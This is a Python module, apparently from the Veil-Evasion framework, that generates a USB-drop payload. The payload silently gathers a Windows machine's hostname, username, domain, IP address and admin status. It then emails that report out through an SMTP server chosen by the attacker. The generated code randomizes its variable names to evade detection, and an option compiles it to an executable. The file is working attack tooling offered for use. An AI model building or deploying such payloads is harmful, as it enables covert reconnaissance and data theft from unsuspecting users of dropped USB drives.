"""

Mostly harmless USB-drop payload that performs simple environment collection from the target and sends a report via a remote smtp server.

Created by @Und3rf10w on 4/20/2015

"""

from modules.common import helpers
from modules.common import encryption
# from modules.common.pythonpayload import PythonPayload

# class Payload(PythonPayload):
class Payload:

    def __init__(self):
        # veil-evasion module metadata
        #PythonPayload.__init__(self)
        self.description = "Payload that collects Windows machine info, then emails it, no persistence"
        self.rating = "Undetermined"
        self.language = "python"
        self.extension = "py"

        # module required options
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executeable"],
                                "recipent_email_address" : ["your.email@domain.tld", "Email to send report to"],
                                "sending_email" : ["your_email@gmail.com", "Email address to send from"],
                                "smtp_server" : ["smtp.gmail.com", "The SMTP server to use"],
                                "smtp_port" : ["465", "The SMTP port to use"],
                                "smtp_user" : ["your_email@gmail.com", "The username used to login to the smtp server"],
                                "smtp_password" : ["hunter2", "Application specific password to use for SMTP login"],
                                "smtp_is_ssl" : ["Y", "Whether the SMTP server uses SSL."],
                                "payload_id" : ["1", "OPTIONAL: The ID of this payload"]}

    def generate(self):
        # randomize variable names used
        hostname = helpers.randomString()
        username = helpers.randomString()
        domainname = helpers.randomString()
        ipaddy = helpers.randomString()
        isadmin = helpers.randomString()
        message = helpers.randomString()
        sender = helpers.randomString()
        receiver = helpers.randomString()
        smtp_message = helpers.randomString()
        smtpObj = helpers.randomString()
        login = helpers.randomString()
        sendmail = helpers.randomString()
        usbid = helpers.randomString()


        payloadCode = "from os import getenv\n"
        payloadCode += "import socket,ctypes,smtplib\n"
        # grab the machine info
        payloadCode += "%s = socket.gethostname()\n" %(hostname)
        payloadCode += "%s = getenv('USERNAME')\n" %(username)
        payloadCode += "%s = getenv('DOMAINNAME')\n" %(domainname)
        payloadCode += "%s = socket.gethostbyname(%s)\n" %(ipaddy,hostname)
        payloadCode += "%s = \"%s\"\n" %(usbid,self.required_options["payload_id"][0])
        payloadCode += "%s = ctypes.windll.shell32.IsUserAnAdmin() != 0\n" %isadmin
        payloadCode += "if %s == None:\n" %(domainname)
        payloadCode += "\t%s = 'No Domain'\n" %(domainname)
        payloadCode += "if %s == False:\n" %(isadmin)
        payloadCode += "\t%s = 'Script not ran as admin'\n" %(isadmin)
        payloadCode += "else:\n"
        payloadCode += "\t%s = 'Script ran as admin'\n" %(isadmin)
        # build message
        payloadCode += "%s = \"\"\"USB ID: %%s\nHostname: %%s\nUsername: %%s\nDomain Name: %%s\nMachine IP Address: %%s\n%%s\"\"\" %% (%s,%s,%s,%s,%s,%s)\n" % (message,usbid,hostname,username,domainname,ipaddy,isadmin)
        payloadCode += "%s = '%s'\n" %(sender,self.required_options["sending_email"][0])
        payloadCode += "%s = ['%s']\n" %(receiver,self.required_options["recipent_email_address"][0])
        payloadCode += "%s = \"\"\"From: Payload Reports <%s>\nTo: %s\nSubject: SE Payload Report\n\n%%s\"\"\" %% %s\n" %(smtp_message,self.required_options["sending_email"][0],self.required_options["recipent_email_address"][0],message)
        if self.required_options["smtp_is_ssl"][0].lower() == "y":
                payloadCode += "%s = smtplib.SMTP_SSL('%s', %s)\n" %(smtpObj,self.required_options["smtp_server"][0],self.required_options["smtp_port"][0])
        else:
                payloadCode += "%s = smtplib.SMTP('%s', %s)\n" %(smtpObj,self.required_options["smtp_server"][0],self.required_options["smtp_port"][0])
        payloadCode += "%s.login(\"%s\", \"%s\")\n" %(smtpObj,self.required_options["smtp_user"][0],self.required_options["smtp_password"][0])
        payloadCode += "%s.sendmail(\"%s\", \"%s\", %s)" %(smtpObj,self.required_options["smtp_user"][0],self.required_options["recipent_email_address"][0],smtp_message)

        return payloadCode
